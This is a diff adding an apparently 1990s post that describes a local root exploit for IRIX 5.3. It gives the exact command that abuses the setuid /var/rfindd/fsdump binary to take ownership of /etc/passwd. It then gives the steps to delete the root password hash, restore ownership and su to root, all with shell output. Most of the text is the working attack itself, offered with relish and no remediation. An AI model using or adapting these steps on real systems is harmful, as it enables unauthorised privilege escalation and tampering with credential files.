@@ -1,0 +1,58 @@
+Ok. Well, yet another IRIX 5.3 root exploit.
+Of course, the major problem here is that IRIX allow users to
+give away ownership of files. Without that, this could only
+be used for changing the permissions on file so that you could read
+and modify.
+
+The system (an Indy):
+IRIX irix 5.3 11091812 IP22 mips
+
+irix% ls -la /var/rfindd/fsdump
+---s--x--x    1 root     sys        62032 Jul 25  1995 /var/rfindd/fsdump
+
+What tipped me off that it was exploitable was the fact that it
+was a protected suid binary (---s--x--x). I thought: if someone at
+SGI is being careful to not let non-root users read the binary,
+then it *must* be packed with holes... :-)
+
+So, I'm just a normal user today...
+
+irix% id
+uid=1799(csh) gid=500(users)
+
+irix% /var/rfindd/fsdump -L/etc/passwd -F/tmp/dump /
+(count to three, and hit ctrl-c)
+
+irix% ls -la /etc/passwd
+-rw-r--r--    1 csh      users        956 Feb 25 06:23 /etc/passwd
+
+And now I've got root access...
+
+irix% tail -8 /etc/passwd
+nobody:*:60001:60001:SVR4 nobody uid:/dev/null:/dev/null
+noaccess:*:60002:60002:uid no access:/dev/null:/dev/null
+nobody:*:-2:-2:original nobody uid:/dev/null:/dev/null
+
+Tue Feb 25 06:23:48 PST 1997
+Number of inodes total 208740; allocated 31259
+Collecting garbage.
+interrupted
+
+All you have to do is edit off the garbage from the passwd file,
+delete the encrypted root password and reset the perms on the passwd file.
+
+irix% vi /etc/passwd            # remove the encrypted root password
+irix% chgrp sys /etc/passwd
+irix% chown root /etc/passwd
+irix% su -
+irix#
+
+
+That's it.
+(Heck, you don't even have to remove the garbage from the passwd file.)
+
+This can be used to access pretty much any file on the system
+which is currently group owned...
+
+fun, fun, fun until SGI takes the bugs away... ;-) (right)
+
